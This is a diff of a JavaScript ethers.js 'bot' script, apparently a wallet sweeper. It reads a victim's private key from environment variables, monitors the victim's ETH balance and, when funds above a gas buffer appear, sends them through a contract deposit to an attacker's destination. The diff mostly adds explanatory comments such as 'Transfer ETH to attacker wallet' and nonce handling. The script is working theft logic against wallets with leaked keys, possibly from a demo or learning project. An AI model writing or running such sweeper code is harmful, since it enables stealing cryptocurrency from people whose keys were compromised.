@@ -7,10 +7,11 @@ const provider = new ethers.providers.JsonRpcProvider(process.env.ATTACKER_RPC_U
 const attackerAddress = process.env.ATTACKER_PUBLIC_KEY;
 const victimPrivateKey = process.env.VICTIM_PRIVATE_KEY;
 
-const ERC20ABI = require('../artifacts/contracts/LolCoin.sol/LOLCOIN.json');
+//const ERC20ABI = require('../artifacts/contracts/LolCoin.sol/LOLCOIN.json');
 
 const bot = async () => {
 
+    //ERC20 Token Contract of HAHA Token
     const FundMeAttacker = await ethers.getContractFactory("FundMe");
     const contract = await FundMeAttacker.attach(
         process.env.FUND_ME_CONTRACT // The deployed contract address of FundMe.sol
@@ -32,7 +33,6 @@ const bot = async () => {
         //Minimum ETH required to pay for gasFees
         const txBuffer = ethers.utils.parseEther(".08");
         const txBufferinETH = ethers.utils.formatEther(txBuffer);
-        //console.log(victimBalance - txBufferinETH > 0);
 
         if (victimBalance - txBufferinETH > 0) {
             console.log("ETH FOUND!");
@@ -51,8 +51,11 @@ const bot = async () => {
                 const attackerGasPriceGwei = ethers.utils.formatUnits(attackerGasPrice, "gwei");
                 console.log("Set gasPrice (in gwei): " + attackerGasPriceGwei);
 
+                //get the current tx Nonce to prevent the tx from getting stuck in the mempool
+                //if the mempool has a tx pending with lower tx, then our current tx wont go through  
                 const currentNonce = await provider.getTransactionCount(victimWallet.address);
 
+                //Transfer ETH to attacker wallet
                 const tx = await contract.connect(victim).deposit({
                     from: victimWallet.address,
                     value: ethers.utils.parseEther(amountToTransfer.toString()),
